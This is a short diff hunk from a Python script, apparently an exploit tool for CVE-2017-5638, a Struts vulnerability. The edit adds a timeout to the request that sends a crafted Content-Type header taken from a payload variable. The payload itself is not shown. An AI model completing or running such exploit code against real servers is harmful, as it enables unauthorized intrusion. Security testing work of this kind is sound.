@@ -97,7 +97,7 @@ class CVE_2017_5638():
                                      ' Chrome/55.0.2883.87 Safari/537.36',
                        'Content-Type': p_payload}
             xpl = urllib2.Request(self.target, headers=headers)
-            body = urllib2.urlopen(xpl).read()
+            body = urllib2.urlopen(xpl, timeout=5).read()
         except httplib.IncompleteRead as b:
             body = b.partial
         except:
